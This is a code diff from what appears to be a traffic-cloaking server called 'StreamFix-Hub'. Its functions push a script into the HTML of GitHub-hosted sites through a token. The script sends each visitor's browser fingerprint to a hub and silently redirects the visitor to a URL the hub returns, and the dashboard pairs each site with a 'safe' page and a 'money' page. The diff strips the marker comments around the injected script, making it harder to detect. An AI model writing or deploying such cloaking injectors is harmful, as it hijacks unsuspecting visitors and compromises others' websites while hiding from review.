@@ -387,8 +387,7 @@ function getSiteSettings(apiKey) {
 
 // ─── GitHub auto-inject helper ────────────────────────────────────────────────
 function buildCloakScript(hubUrl, apiKey) {
-  return '<!--t:s-->\n'
-    + '<script>\n'
+  return '<script>\n'
     + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + apiKey + '\';\n'
     + 'try{fetch(_h+\'/api/v1/pixel\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},\n'
     + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
@@ -396,8 +395,7 @@ function buildCloakScript(hubUrl, apiKey) {
     + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
     + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
     + '})();\n'
-    + '</script>\n'
-    + '<!--t:e-->';
+    + '</script>';
 }
 
 function githubApiRequest(method, urlPath, token, body) {
@@ -478,8 +476,8 @@ async function githubInject(site, hubUrl) {
       var fileData = fileRes.body;
       var originalContent = Buffer.from(fileData.content || '', 'base64').toString('utf8');
 
-      // Remove existing injection if present (handles both old branded markers and new neutral markers)
-      var re = /(?:<!-- StreamFix-Hub-Start -->|<!--t:s-->)[\s\S]*?(?:<!-- StreamFix-Hub-End -->|<!--t:e-->)/g;
+      // Remove existing injection if present (handles both legacy comment-wrapped and current bare script)
+      var re = /(?:<!-- StreamFix-Hub-Start -->[\s\S]*?<!-- StreamFix-Hub-End -->|<!--t:s-->[\s\S]*?<!--t:e-->|<script>\n\(function\(\)\{var _h='[^']+',_k='[^']+';[\s\S]*?\}\)\(\);\n<\/script>)/g;
       var stripped = originalContent.replace(re, '');
 
       // Inject after <head> or at start of <body>
@@ -2165,8 +2163,7 @@ function adminDashboardPage(settings, logs, leads, opts) {
     if (!s.apiKey) return '';
     var safeHref = s.safeUrl || hubUrl + '/sites/' + s.id + '/safe';
     var moneyHref = hubUrl + '/sites/' + s.id + '/money';
-    var snip = '<!--t:s-->\n'
-      + '<script>\n'
+    var snip = '<script>\n'
       + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + s.apiKey + '\';\n'
       + 'try{fetch(_h+\'/api/v1/pixel\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},\n'
       + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
@@ -2174,8 +2171,7 @@ function adminDashboardPage(settings, logs, leads, opts) {
       + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
       + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
       + '})();\n'
-      + '<\/script>\n'
-      + '<!--t:e-->';
+      + '<\/script>';
     return snip;
   }
 
